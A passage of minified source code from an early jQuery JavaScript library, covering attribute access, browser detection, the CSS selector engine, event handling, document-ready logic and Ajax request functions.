ret=jQuery.merge(ret,elem);});return ret;},attr:function(elem,name,value){if(!elem||elem.nodeType==3||elem.nodeType==8)return undefined;var notxml=!jQuery.isXMLDoc(elem),set=value!==undefined,msie=jQuery.browser.msie;name=notxml&&jQuery.props[name]||name;if(elem.tagName){var special=/href|src|style/.test(name);if(name=="selected"&&jQuery.browser.safari)elem.parentNode.selectedIndex;if(name in elem&&notxml&&!special){if(set){if(name=="type"&&jQuery.nodeName(elem,"input")&&elem.parentNode)throw"type property can't be changed";elem[name]=value;}if(jQuery.nodeName(elem,"form")&&elem.getAttributeNode(name))return elem.getAttributeNode(name).nodeValue;return elem[name];}if(msie&&notxml&&name=="style")return jQuery.attr(elem.style,"cssText",value);if(set)elem.setAttribute(name,""+value);var attr=msie&&notxml&&special?elem.getAttribute(name,2):elem.getAttribute(name);return attr===null?undefined:attr;}if(msie&&name=="opacity"){if(set){elem.zoom=1;elem.filter=(elem.filter||"").replace(/alpha\([^)]*\)/,"")+(parseInt(value)+''=="NaN"?"":"alpha(opacity="+value*100+")");}return elem.filter&&elem.filter.indexOf("opacity=")>=0?(parseFloat(elem.filter.match(/opacity=([^)]*)/)[1])/100)+'':"";}name=name.replace(/-([a-z])/ig,function(all,letter){return letter.toUpperCase();});if(set)elem[name]=value;return elem[name];},trim:function(text){return(text||"").replace(/^\s+|\s+$/g,"");},makeArray:function(array){var ret=[];if(array!=null){var i=array.length;if(i==null||array.split||array.setInterval||array.call)ret[0]=array;else
while(i)ret[--i]=array[i];}return ret;},inArray:function(elem,array){for(var i=0,length=array.length;i<length;i++)if(array[i]===elem)return i;return-1;},merge:function(first,second){var i=0,elem,pos=first.length;if(jQuery.browser.msie){while(elem=second[i++])if(elem.nodeType!=8)first[pos++]=elem;}else
while(elem=second[i++])first[pos++]=elem;return first;},unique:function(array){var ret=[],done={};try{for(var i=0,length=array.length;i<length;i++){var id=jQuery.data(array[i]);if(!done[id]){done[id]=true;ret.push(array[i]);}}}catch(e){ret=array;}return ret;},grep:function(elems,callback,inv){var ret=[];for(var i=0,length=elems.length;i<length;i++)if(!inv!=!callback(elems[i],i))ret.push(elems[i]);return ret;},map:function(elems,callback){var ret=[];for(var i=0,length=elems.length;i<length;i++){var value=callback(elems[i],i);if(value!=null)ret[ret.length]=value;}return ret.concat.apply([],ret);}});var userAgent=navigator.userAgent.toLowerCase();jQuery.browser={version:(userAgent.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[])[1],safari:/webkit/.test(userAgent),opera:/opera/.test(userAgent),msie:/msie/.test(userAgent)&&!/opera/.test(userAgent),mozilla:/mozilla/.test(userAgent)&&!/(compatible|webkit)/.test(userAgent)};var styleFloat=jQuery.browser.msie?"styleFloat":"cssFloat";jQuery.extend({boxModel:!jQuery.browser.msie||document.compatMode=="CSS1Compat",props:{"for":"htmlFor","class":"className","float":styleFloat,cssFloat:styleFloat,styleFloat:styleFloat,readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing"}});jQuery.each({parent:function(elem){return elem.parentNode;},parents:function(elem){return jQuery.dir(elem,"parentNode");},next:function(elem){return jQuery.nth(elem,2,"nextSibling");},prev:function(elem){return jQuery.nth(elem,2,"previousSibling");},nextAll:function(elem){return jQuery.dir(elem,"nextSibling");},prevAll:function(elem){return jQuery.dir(elem,"previousSibling");},siblings:function(elem){return jQuery.sibling(elem.parentNode.firstChild,elem);},children:function(elem){return jQuery.sibling(elem.firstChild);},contents:function(elem){return jQuery.nodeName(elem,"iframe")?elem.contentDocument||elem.contentWindow.document:jQuery.makeArray(elem.childNodes);}},function(name,fn){jQuery.fn[name]=function(selector){var ret=jQuery.map(this,fn);if(selector&&typeof selector=="string")ret=jQuery.multiFilter(selector,ret);return this.pushStack(jQuery.unique(ret));};});jQuery.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(name,original){jQuery.fn[name]=function(){var args=arguments;return this.each(function(){for(var i=0,length=args.length;i<length;i++)jQuery(args[i])[original](this);});};});jQuery.each({removeAttr:function(name){jQuery.attr(this,name,"");if(this.nodeType==1)this.removeAttribute(name);},addClass:function(classNames){jQuery.className.add(this,classNames);},removeClass:function(classNames){jQuery.className.remove(this,classNames);},toggleClass:function(classNames){jQuery.className[jQuery.className.has(this,classNames)?"remove":"add"](this,classNames);},remove:function(selector){if(!selector||jQuery.filter(selector,[this]).r.length){jQuery("*",this).add(this).each(function(){jQuery.event.remove(this);jQuery.removeData(this);});if(this.parentNode)this.parentNode.removeChild(this);}},empty:function(){jQuery(">*",this).remove();while(this.firstChild)this.removeChild(this.firstChild);}},function(name,fn){jQuery.fn[name]=function(){return this.each(fn,arguments);};});jQuery.each(["Height","Width"],function(i,name){var type=name.toLowerCase();jQuery.fn[type]=function(size){return this[0]==window?jQuery.browser.opera&&document.body["client"+name]||jQuery.browser.safari&&window["inner"+name]||document.compatMode=="CSS1Compat"&&document.documentElement["client"+name]||document.body["client"+name]:this[0]==document?Math.max(Math.max(document.body["scroll"+name],document.documentElement["scroll"+name]),Math.max(document.body["offset"+name],document.documentElement["offset"+name])):size==undefined?(this.length?jQuery.css(this[0],type):null):this.css(type,size.constructor==String?size:size+"px");};});function num(elem,prop){return elem[0]&&parseInt(jQuery.curCSS(elem[0],prop,true),10)||0;}var chars=jQuery.browser.safari&&parseInt(jQuery.browser.version)<417?"(?:[\\w*_-]|\\\\.)":"(?:[\\w\u0128-\uFFFF*_-]|\\\\.)",quickChild=new RegExp("^>\\s*("+chars+"+)"),quickID=new RegExp("^("+chars+"+)(#)("+chars+"+)"),quickClass=new RegExp("^([#.]?)("+chars+"*)");jQuery.extend({expr:{"":function(a,i,m){return m[2]=="*"||jQuery.nodeName(a,m[2]);},"#":function(a,i,m){return a.getAttribute("id")==m[2];},":":{lt:function(a,i,m){return i<m[3]-0;},gt:function(a,i,m){return i>m[3]-0;},nth:function(a,i,m){return m[3]-0==i;},eq:function(a,i,m){return m[3]-0==i;},first:function(a,i){return i==0;},last:function(a,i,m,r){return i==r.length-1;},even:function(a,i){return i%2==0;},odd:function(a,i){return i%2;},"first-child":function(a){return a.parentNode.getElementsByTagName("*")[0]==a;},"last-child":function(a){return jQuery.nth(a.parentNode.lastChild,1,"previousSibling")==a;},"only-child":function(a){return!jQuery.nth(a.parentNode.lastChild,2,"previousSibling");},parent:function(a){return a.firstChild;},empty:function(a){return!a.firstChild;},contains:function(a,i,m){return(a.textContent||a.innerText||jQuery(a).text()||"").indexOf(m[3])>=0;},visible:function(a){return"hidden"!=a.type&&jQuery.css(a,"display")!="none"&&jQuery.css(a,"visibility")!="hidden";},hidden:function(a){return"hidden"==a.type||jQuery.css(a,"display")=="none"||jQuery.css(a,"visibility")=="hidden";},enabled:function(a){return!a.disabled;},disabled:function(a){return a.disabled;},checked:function(a){return a.checked;},selected:function(a){return a.selected||jQuery.attr(a,"selected");},text:function(a){return"text"==a.type;},radio:function(a){return"radio"==a.type;},checkbox:function(a){return"checkbox"==a.type;},file:function(a){return"file"==a.type;},password:function(a){return"password"==a.type;},submit:function(a){return"submit"==a.type;},image:function(a){return"image"==a.type;},reset:function(a){return"reset"==a.type;},button:function(a){return"button"==a.type||jQuery.nodeName(a,"button");},input:function(a){return/input|select|textarea|button/i.test(a.nodeName);},has:function(a,i,m){return jQuery.find(m[3],a).length;},header:function(a){return/h\d/i.test(a.nodeName);},animated:function(a){return jQuery.grep(jQuery.timers,function(fn){return a==fn.elem;}).length;}}},parse:[/^(\[) *@?([\w-]+) *([!*$^~=]*) *('?"?)(.*?)\4 *\]/,/^(:)([\w-]+)\("?'?(.*?(\(.*?\))?[^(]*?)"?'?\)/,new RegExp("^([:.#]*)("+chars+"+)")],multiFilter:function(expr,elems,not){var old,cur=[];while(expr&&expr!=old){old=expr;var f=jQuery.filter(expr,elems,not);expr=f.t.replace(/^\s*,\s*/,"");cur=not?elems=f.r:jQuery.merge(cur,f.r);}return cur;},find:function(t,context){if(typeof t!="string")return[t];if(context&&context.nodeType!=1&&context.nodeType!=9)return[];context=context||document;var ret=[context],done=[],last,nodeName;while(t&&last!=t){var r=[];last=t;t=jQuery.trim(t);var foundToken=false,re=quickChild,m=re.exec(t);if(m){nodeName=m[1].toUpperCase();for(var i=0;ret[i];i++)for(var c=ret[i].firstChild;c;c=c.nextSibling)if(c.nodeType==1&&(nodeName=="*"||c.nodeName.toUpperCase()==nodeName))r.push(c);ret=r;t=t.replace(re,"");if(t.indexOf(" ")==0)continue;foundToken=true;}else{re=/^([>+~])\s*(\w*)/i;if((m=re.exec(t))!=null){r=[];var merge={};nodeName=m[2].toUpperCase();m=m[1];for(var j=0,rl=ret.length;j<rl;j++){var n=m=="~"||m=="+"?ret[j].nextSibling:ret[j].firstChild;for(;n;n=n.nextSibling)if(n.nodeType==1){var id=jQuery.data(n);if(m=="~"&&merge[id])break;if(!nodeName||n.nodeName.toUpperCase()==nodeName){if(m=="~")merge[id]=true;r.push(n);}if(m=="+")break;}}ret=r;t=jQuery.trim(t.replace(re,""));foundToken=true;}}if(t&&!foundToken){if(!t.indexOf(",")){if(context==ret[0])ret.shift();done=jQuery.merge(done,ret);r=ret=[context];t=" "+t.substr(1,t.length);}else{var re2=quickID;var m=re2.exec(t);if(m){m=[0,m[2],m[3],m[1]];}else{re2=quickClass;m=re2.exec(t);}m[2]=m[2].replace(/\\/g,"");var elem=ret[ret.length-1];if(m[1]=="#"&&elem&&elem.getElementById&&!jQuery.isXMLDoc(elem)){var oid=elem.getElementById(m[2]);if((jQuery.browser.msie||jQuery.browser.opera)&&oid&&typeof oid.id=="string"&&oid.id!=m[2])oid=jQuery('[@id="'+m[2]+'"]',elem)[0];ret=r=oid&&(!m[3]||jQuery.nodeName(oid,m[3]))?[oid]:[];}else{for(var i=0;ret[i];i++){var tag=m[1]=="#"&&m[3]?m[3]:m[1]!=""||m[0]==""?"*":m[2];if(tag=="*"&&ret[i].nodeName.toLowerCase()=="object")tag="param";r=jQuery.merge(r,ret[i].getElementsByTagName(tag));}if(m[1]==".")r=jQuery.classFilter(r,m[2]);if(m[1]=="#"){var tmp=[];for(var i=0;r[i];i++)if(r[i].getAttribute("id")==m[2]){tmp=[r[i]];break;}r=tmp;}ret=r;}t=t.replace(re2,"");}}if(t){var val=jQuery.filter(t,r);ret=r=val.r;t=jQuery.trim(val.t);}}if(t)ret=[];if(ret&&context==ret[0])ret.shift();done=jQuery.merge(done,ret);return done;},classFilter:function(r,m,not){m=" "+m+" ";var tmp=[];for(var i=0;r[i];i++){var pass=(" "+r[i].className+" ").indexOf(m)>=0;if(!not&&pass||not&&!pass)tmp.push(r[i]);}return tmp;},filter:function(t,r,not){var last;while(t&&t!=last){last=t;var p=jQuery.parse,m;for(var i=0;p[i];i++){m=p[i].exec(t);if(m){t=t.substring(m[0].length);m[2]=m[2].replace(/\\/g,"");break;}}if(!m)break;if(m[1]==":"&&m[2]=="not")r=isSimple.test(m[3])?jQuery.filter(m[3],r,true).r:jQuery(r).not(m[3]);else if(m[1]==".")r=jQuery.classFilter(r,m[2],not);else if(m[1]=="["){var tmp=[],type=m[3];for(var i=0,rl=r.length;i<rl;i++){var a=r[i],z=a[jQuery.props[m[2]]||m[2]];if(z==null||/href|src|selected/.test(m[2]))z=jQuery.attr(a,m[2])||'';if((type==""&&!!z||type=="="&&z==m[5]||type=="!="&&z!=m[5]||type=="^="&&z&&!z.indexOf(m[5])||type=="$="&&z.substr(z.length-m[5].length)==m[5]||(type=="*="||type=="~=")&&z.indexOf(m[5])>=0)^not)tmp.push(a);}r=tmp;}else if(m[1]==":"&&m[2]=="nth-child"){var merge={},tmp=[],test=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(m[3]=="even"&&"2n"||m[3]=="odd"&&"2n+1"||!/\D/.test(m[3])&&"0n+"+m[3]||m[3]),first=(test[1]+(test[2]||1))-0,last=test[3]-0;for(var i=0,rl=r.length;i<rl;i++){var node=r[i],parentNode=node.parentNode,id=jQuery.data(parentNode);if(!merge[id]){var c=1;for(var n=parentNode.firstChild;n;n=n.nextSibling)if(n.nodeType==1)n.nodeIndex=c++;merge[id]=true;}var add=false;if(first==0){if(node.nodeIndex==last)add=true;}else if((node.nodeIndex-last)%first==0&&(node.nodeIndex-last)/first>=0)add=true;if(add^not)tmp.push(node);}r=tmp;}else{var fn=jQuery.expr[m[1]];if(typeof fn=="object")fn=fn[m[2]];if(typeof fn=="string")fn=eval("false||function(a,i){return "+fn+";}");r=jQuery.grep(r,function(elem,i){return fn(elem,i,m,r);},not);}}return{r:r,t:t};},dir:function(elem,dir){var matched=[],cur=elem[dir];while(cur&&cur!=document){if(cur.nodeType==1)matched.push(cur);cur=cur[dir];}return matched;},nth:function(cur,result,dir,elem){result=result||1;var num=0;for(;cur;cur=cur[dir])if(cur.nodeType==1&&++num==result)break;return cur;},sibling:function(n,elem){var r=[];for(;n;n=n.nextSibling){if(n.nodeType==1&&n!=elem)r.push(n);}return r;}});jQuery.event={add:function(elem,types,handler,data){if(elem.nodeType==3||elem.nodeType==8)return;if(jQuery.browser.msie&&elem.setInterval)elem=window;if(!handler.guid)handler.guid=this.guid++;if(data!=undefined){var fn=handler;handler=this.proxy(fn,function(){return fn.apply(this,arguments);});handler.data=data;}var events=jQuery.data(elem,"events")||jQuery.data(elem,"events",{}),handle=jQuery.data(elem,"handle")||jQuery.data(elem,"handle",function(){if(typeof jQuery!="undefined"&&!jQuery.event.triggered)return jQuery.event.handle.apply(arguments.callee.elem,arguments);});handle.elem=elem;jQuery.each(types.split(/\s+/),function(index,type){var parts=type.split(".");type=parts[0];handler.type=parts[1];var handlers=events[type];if(!handlers){handlers=events[type]={};if(!jQuery.event.special[type]||jQuery.event.special[type].setup.call(elem)===false){if(elem.addEventListener)elem.addEventListener(type,handle,false);else if(elem.attachEvent)elem.attachEvent("on"+type,handle);}}handlers[handler.guid]=handler;jQuery.event.global[type]=true;});elem=null;},guid:1,global:{},remove:function(elem,types,handler){if(elem.nodeType==3||elem.nodeType==8)return;var events=jQuery.data(elem,"events"),ret,index;if(events){if(types==undefined||(typeof types=="string"&&types.charAt(0)=="."))for(var type in events)this.remove(elem,type+(types||""));else{if(types.type){handler=types.handler;types=types.type;}jQuery.each(types.split(/\s+/),function(index,type){var parts=type.split(".");type=parts[0];if(events[type]){if(handler)delete events[type][handler.guid];else
for(handler in events[type])if(!parts[1]||events[type][handler].type==parts[1])delete events[type][handler];for(ret in events[type])break;if(!ret){if(!jQuery.event.special[type]||jQuery.event.special[type].teardown.call(elem)===false){if(elem.removeEventListener)elem.removeEventListener(type,jQuery.data(elem,"handle"),false);else if(elem.detachEvent)elem.detachEvent("on"+type,jQuery.data(elem,"handle"));}ret=null;delete events[type];}}});}for(ret in events)break;if(!ret){var handle=jQuery.data(elem,"handle");if(handle)handle.elem=null;jQuery.removeData(elem,"events");jQuery.removeData(elem,"handle");}}},trigger:function(type,data,elem,donative,extra){data=jQuery.makeArray(data);if(type.indexOf("!")>=0){type=type.slice(0,-1);var exclusive=true;}if(!elem){if(this.global[type])jQuery("*").add([window,document]).trigger(type,data);}else{if(elem.nodeType==3||elem.nodeType==8)return undefined;var val,ret,fn=jQuery.isFunction(elem[type]||null),event=!data[0]||!data[0].preventDefault;if(event){data.unshift({type:type,target:elem,preventDefault:function(){},stopPropagation:function(){},timeStamp:now()});data[0][expando]=true;}data[0].type=type;if(exclusive)data[0].exclusive=true;var handle=jQuery.data(elem,"handle");if(handle)val=handle.apply(elem,data);if((!fn||(jQuery.nodeName(elem,'a')&&type=="click"))&&elem["on"+type]&&elem["on"+type].apply(elem,data)===false)val=false;if(event)data.shift();if(extra&&jQuery.isFunction(extra)){ret=extra.apply(elem,val==null?data:data.concat(val));if(ret!==undefined)val=ret;}if(fn&&donative!==false&&val!==false&&!(jQuery.nodeName(elem,'a')&&type=="click")){this.triggered=true;try{elem[type]();}catch(e){}}this.triggered=false;}return val;},handle:function(event){var val,ret,namespace,all,handlers;event=arguments[0]=jQuery.event.fix(event||window.event);namespace=event.type.split(".");event.type=namespace[0];namespace=namespace[1];all=!namespace&&!event.exclusive;handlers=(jQuery.data(this,"events")||{})[event.type];for(var j in handlers){var handler=handlers[j];if(all||handler.type==namespace){event.handler=handler;event.data=handler.data;ret=handler.apply(this,arguments);if(val!==false)val=ret;if(ret===false){event.preventDefault();event.stopPropagation();}}}return val;},fix:function(event){if(event[expando]==true)return event;var originalEvent=event;event={originalEvent:originalEvent};var props="altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode metaKey newValue originalTarget pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target timeStamp toElement type view wheelDelta which".split(" ");for(var i=props.length;i;i--)event[props[i]]=originalEvent[props[i]];event[expando]=true;event.preventDefault=function(){if(originalEvent.preventDefault)originalEvent.preventDefault();originalEvent.returnValue=false;};event.stopPropagation=function(){if(originalEvent.stopPropagation)originalEvent.stopPropagation();originalEvent.cancelBubble=true;};event.timeStamp=event.timeStamp||now();if(!event.target)event.target=event.srcElement||document;if(event.target.nodeType==3)event.target=event.target.parentNode;if(!event.relatedTarget&&event.fromElement)event.relatedTarget=event.fromElement==event.target?event.toElement:event.fromElement;if(event.pageX==null&&event.clientX!=null){var doc=document.documentElement,body=document.body;event.pageX=event.clientX+(doc&&doc.scrollLeft||body&&body.scrollLeft||0)-(doc.clientLeft||0);event.pageY=event.clientY+(doc&&doc.scrollTop||body&&body.scrollTop||0)-(doc.clientTop||0);}if(!event.which&&((event.charCode||event.charCode===0)?event.charCode:event.keyCode))event.which=event.charCode||event.keyCode;if(!event.metaKey&&event.ctrlKey)event.metaKey=event.ctrlKey;if(!event.which&&event.button)event.which=(event.button&1?1:(event.button&2?3:(event.button&4?2:0)));return event;},proxy:function(fn,proxy){proxy.guid=fn.guid=fn.guid||proxy.guid||this.guid++;return proxy;},special:{ready:{setup:function(){bindReady();return;},teardown:function(){return;}},mouseenter:{setup:function(){if(jQuery.browser.msie)return false;jQuery(this).bind("mouseover",jQuery.event.special.mouseenter.handler);return true;},teardown:function(){if(jQuery.browser.msie)return false;jQuery(this).unbind("mouseover",jQuery.event.special.mouseenter.handler);return true;},handler:function(event){if(withinElement(event,this))return true;event.type="mouseenter";return jQuery.event.handle.apply(this,arguments);}},mouseleave:{setup:function(){if(jQuery.browser.msie)return false;jQuery(this).bind("mouseout",jQuery.event.special.mouseleave.handler);return true;},teardown:function(){if(jQuery.browser.msie)return false;jQuery(this).unbind("mouseout",jQuery.event.special.mouseleave.handler);return true;},handler:function(event){if(withinElement(event,this))return true;event.type="mouseleave";return jQuery.event.handle.apply(this,arguments);}}}};jQuery.fn.extend({bind:function(type,data,fn){return type=="unload"?this.one(type,data,fn):this.each(function(){jQuery.event.add(this,type,fn||data,fn&&data);});},one:function(type,data,fn){var one=jQuery.event.proxy(fn||data,function(event){jQuery(this).unbind(event,one);return(fn||data).apply(this,arguments);});return this.each(function(){jQuery.event.add(this,type,one,fn&&data);});},unbind:function(type,fn){return this.each(function(){jQuery.event.remove(this,type,fn);});},trigger:function(type,data,fn){return this.each(function(){jQuery.event.trigger(type,data,this,true,fn);});},triggerHandler:function(type,data,fn){return this[0]&&jQuery.event.trigger(type,data,this[0],false,fn);},toggle:function(fn){var args=arguments,i=1;while(i<args.length)jQuery.event.proxy(fn,args[i++]);return this.click(jQuery.event.proxy(fn,function(event){this.lastToggle=(this.lastToggle||0)%i;event.preventDefault();return args[this.lastToggle++].apply(this,arguments)||false;}));},hover:function(fnOver,fnOut){return this.bind('mouseenter',fnOver).bind('mouseleave',fnOut);},ready:function(fn){bindReady();if(jQuery.isReady)fn.call(document,jQuery);else
jQuery.readyList.push(function(){return fn.call(this,jQuery);});return this;}});jQuery.extend({isReady:false,readyList:[],ready:function(){if(!jQuery.isReady){jQuery.isReady=true;if(jQuery.readyList){jQuery.each(jQuery.readyList,function(){this.call(document);});jQuery.readyList=null;}jQuery(document).triggerHandler("ready");}}});var readyBound=false;function bindReady(){if(readyBound)return;readyBound=true;if(document.addEventListener&&!jQuery.browser.opera)document.addEventListener("DOMContentLoaded",jQuery.ready,false);if(jQuery.browser.msie&&window==top)(function(){if(jQuery.isReady)return;try{document.documentElement.doScroll("left");}catch(error){setTimeout(arguments.callee,0);return;}jQuery.ready();})();if(jQuery.browser.opera)document.addEventListener("DOMContentLoaded",function(){if(jQuery.isReady)return;for(var i=0;i<document.styleSheets.length;i++)if(document.styleSheets[i].disabled){setTimeout(arguments.callee,0);return;}jQuery.ready();},false);if(jQuery.browser.safari){var numStyles;(function(){if(jQuery.isReady)return;if(document.readyState!="loaded"&&document.readyState!="complete"){setTimeout(arguments.callee,0);return;}if(numStyles===undefined)numStyles=jQuery("style, link[rel=stylesheet]").length;if(document.styleSheets.length!=numStyles){setTimeout(arguments.callee,0);return;}jQuery.ready();})();}jQuery.event.add(window,"load",jQuery.ready);}jQuery.each(("blur,focus,load,resize,scroll,unload,click,dblclick,"+"mousedown,mouseup,mousemove,mouseover,mouseout,change,select,"+"submit,keydown,keypress,keyup,error").split(","),function(i,name){jQuery.fn[name]=function(fn){return fn?this.bind(name,fn):this.trigger(name);};});var withinElement=function(event,elem){var parent=event.relatedTarget;while(parent&&parent!=elem)try{parent=parent.parentNode;}catch(error){parent=elem;}return parent==elem;};jQuery(window).bind("unload",function(){jQuery("*").add(document).unbind();});jQuery.fn.extend({_load:jQuery.fn.load,load:function(url,params,callback){if(typeof url!='string')return this._load(url);var off=url.indexOf(" ");if(off>=0){var selector=url.slice(off,url.length);url=url.slice(0,off);}callback=callback||function(){};var type="GET";if(params)if(jQuery.isFunction(params)){callback=params;params=null;}else{params=jQuery.param(params);type="POST";}var self=this;jQuery.ajax({url:url,type:type,dataType:"html",data:params,complete:function(res,status){if(status=="success"||status=="notmodified")self.html(selector?jQuery("<div/>").append(res.responseText.replace(/<script(.|\s)*?\/script>/g,"")).find(selector):res.responseText);self.each(callback,[res.responseText,status,res]);}});return this;},serialize:function(){return jQuery.param(this.serializeArray());},serializeArray:function(){return this.map(function(){return jQuery.nodeName(this,"form")?jQuery.makeArray(this.elements):this;}).filter(function(){return this.name&&!this.disabled&&(this.checked||/select|textarea/i.test(this.nodeName)||/text|hidden|password/i.test(this.type));}).map(function(i,elem){var val=jQuery(this).val();return val==null?null:val.constructor==Array?jQuery.map(val,function(val,i){return{name:elem.name,value:val};}):{name:elem.name,value:val};}).get();}});jQuery.each("ajaxStart,ajaxStop,ajaxComplete,ajaxError,ajaxSuccess,ajaxSend".split(","),function(i,o){jQuery.fn[o]=function(f){return this.bind(o,f);};});var jsc=now();jQuery.extend({get:function(url,data,callback,type){if(jQuery.isFunction(data)){callback=data;data=null;}return jQuery.ajax({type:"GET",url:url,data:data,success:callback,dataType:type});},getScript:function(url,callback){return jQuery.get(url,null,callback,"script");},getJSON:function(url,data,callback){return jQuery.get(url,data,callback,"json");},post:function(url,data,callback,type){if(jQuery.isFunction(data)){callback=data;data={};}return jQuery.ajax({type:"POST",url:url,data:data,success:callback,dataType:type});},ajaxSetup:function(settings){jQuery.extend(jQuery.ajaxSettings,settings);},ajaxSettings:{url:location.href,global:true,type:"GET",timeout:0,contentType:"application/x-www-form-urlencoded",processData:true,async:true,data:null,username:null,password:null,accepts:{xml:"application/xml, text/xml",html:"text/html",script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},lastModified:{},ajax:function(s){s=jQuery.extend(true,s,jQuery.extend(true,{},jQuery.ajaxSettings,s));var jsonp,jsre=/=\?(&|$)/g,status,data,type=s.type.toUpperCase();if(s.data&&s.processData&&typeof s.data!="string")s.data=jQuery.param(s.data);if(s.dataType=="jsonp"){if(type=="GET"){if(!s.url.match(jsre))s.url+=(s.url.match(/\?/)?"&":"?")+(s.jsonp||"callback")+"=?";}else if(!s.data||!s.data.match(jsre))s.data=(s.data?s.data+"&":"")+(s.jsonp||"callback")+"=?";s.dataType="json";}if(s.dataType=="json"&&(s.data&&s.data.match(jsre)||s.url.match(jsre))){jsonp="jsonp"+jsc++;if(s.data)s.data=(s.data+"").replace(jsre,"="+jsonp+"$1");s.url=s.url.replace(jsre,"="+jsonp+"$1");s.dataType="script";window[jsonp]=function(tmp){data=tmp;success();complete();window[jsonp]=undefined;try{delete window[jsonp];}catch(e){}if(head)head.removeChild(script);};}if(s.dataType=="script"&&s.cache==null)s.cache=false;if(s.cache===false&&type=="GET"){var ts=now();var ret=s.url.replace(/(\?|&)_=.*?(&|$)/,"$1_="+ts+"$2");s.url=ret+((ret==s.url)?(s.url.match(/\?/)?"&":"?")+"_="+ts:"");}if(s.data&&type=="GET"){s.url+=(s.url.match(/\?/)?"&":"?")+s.data;s.data=null;}if(s.global&&!jQuery.active++)jQuery.event.trigger("ajaxStart");var remote=/^(?:\w+:)?\/\/([^\/?#]+)/;if(s.dataType=="script"&&type=="GET"&&remote.test(s.url)&&remote.exec(s.url)[1]!=location.host){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.src=s.url;if(s.scriptCharset)script.charset=s.scriptCharset;if(!jsonp){var done=false;script.onload=script.onreadystatechange=function(){if(!done&&(!this.readyState||this.readyState=="loaded"||this.readyState=="complete")){done=true;success();complete();head.removeChild(script);}};}head.appendChild(script);return undefined;}var requestDone=false;var xhr=window.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest();if(s.username)xhr.open(type,s.url,s.async,s.username,s.password);else
xhr.open(type,s.url,s.async);try{if(s.data)xhr.setRequestHeader("Content-Type",s.contentType);if(s.ifModified)xhr.setRequestHeader("If-Modified-Since",jQuery.lastModified[s.url]||"Thu, 01 Jan 1970 00:00:00 GMT");xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");xhr.setRequestHeader("Accept",s.dataType&&s.accepts[s.dataType]?s.accepts[s.dataType]+", */*":s.accepts._default);}catch(e){}if(s.beforeSend&&s.beforeSend(xhr,s)===false){s.global&&jQuery.active--;xhr.abort();return false;}if(s.global)jQuery.event.trigger("ajaxSend",[xhr,s]);var onreadystatechange=function(isTimeout){if(!requestDone&&xhr&&(xhr.readyState==4||isTimeout=="timeout")){requestDone=true;if(ival){clearInterval(ival);ival=null;}status=isTimeout=="timeout"&&"timeout"||!jQuery.httpSuccess(xhr)&&"error"||s.ifModified&&jQuery.httpNotModified(xhr,s.url)&&"notmodified"||"success";if(status=="success"){try{data=jQuery.httpData(xhr,s.dataType,s.dataFilter);}catch(e){status="parsererror";}}if(status=="success"){var modRes;try{modRes=xhr.getResponseHeader("Last-Modified");}catch(e){}if(s.ifModified&&modRes)jQuery.lastModified[s.url]=modRes;if(!jsonp)success();}else
jQuery.handleError(s,xhr,status);complete();if(s.async)xhr=null;}};if(s.async){var ival=setInterval(onreadystatechange,13);if(s.timeout>0)setTimeout(function(){if(xhr){xhr.abort();if(!requestDone)onreadystatechange("timeout");}},s.timeout);}try{xhr.send(s.data);}catch(e){jQuery.handleError(s,xhr,null,e);}if(!s.async)onreadystatechange();function success(){if(s.success)s.success(data,status);if(s.global)jQuery.event.trigger("ajaxSuccess",[xhr,s]);}function complete(){if(s.complete)s.complete(xhr,status);if(s.global)jQuery.event.trigger("ajaxComplete",[xhr,s]);if(s.global&&!--jQuery.active)jQuery.event.trigger("ajaxStop");}return xhr;},handleError:function(s,xhr,status,e){if(s.error)s.error(xhr,status,e);if(s.global)jQuery.event.trigger("ajaxError",[xhr,s,e]);},active:0,httpSuccess:function(xhr){try{return!xhr.status&&location.protocol=="file:"||(xhr.status>=200&&xhr.status<300)||xhr.status==304||xhr.status==1223||jQuery.browser.safari&&xhr.status==undefined;}catch(e){}return false;},httpNotModified:function(xhr,url){try{var xhrRes=xhr.getResponseHeader("Last-Modified");return xhr.status==304||xhrRes==jQuery.lastModified[url]||jQuery.browser.safari&&xhr.status==undefined;}catch(e){}return false;},httpData:function(xhr,type,filter){var ct=xhr.getResponseHeader("content-type"),xml=type=="xml"||!type&&ct&&ct.indexOf("xml")>=0,data=xml?xhr.responseXML:xhr.responseText;if(xml&&data.documentElement.tagName=="parsererror")throw"parsererror";if(filter)data=filter(data,type);if(type=="script")jQuery.globalEval(data);if(type=="json")data=eval("("+data+")");return data;},param:function(a){var s=[];if(a.constructor==Array||a.jquery)jQuery.each(a,function(){s.push(encodeURIComponent(this.name)+"="+encodeURIComponent(this.value));});else
for(var j in a)if(a[j]&&a[j].constructor==Array)jQuery.each(a[j],function(){s.push(encodeURIComponent(j)+"="+encodeURIComponent(this));});else
s.push(encodeURIComponent(j)+"="+encodeURIComponent(jQuery.isFunction(a[j])?a[j]():a[j]));return s.join("&").replace(/%20/g,"+");}});jQuery.fn.extend({show:function(speed,callback){return speed?this.animate({height:"show",width:"show",opacity:"show"},speed,callback):this.filter(":hidden").each(function(){this.style.display=this.oldblock||"";if(jQuery.css(this,"display")=="none"){var elem=jQuery("<"+this.tagName+" />").appendTo("body");this.style.display=elem.css("display");if(this.style.display=="none")this.style.display="block";elem.remove();}}).end();},hide:function(speed,callback){return speed?this.animate({height:"hide",width:"hide",opacity:"hide"},speed,callback):this.filter(":visible").each(function(){this.oldblock=this.oldblock||jQuery.css(this,"display");this.style.display="none";}).end();},_toggle:jQuery.fn.toggle,toggle:function(fn,fn2){return jQuery.isFunction(fn)&&jQuery.isFunction(fn2)?this._toggle.apply(this,arguments):fn?this.animate({height:"toggle",width:"toggle",opacity:"toggle"},fn,fn2):this.each(function(){jQuery(this)[jQuery(this).is(":hidden")?"show":"hide"]();});},slideDown:function(speed,callback){return this.animate({height:"show"},speed,callback);},slideUp:function(speed,callback){return 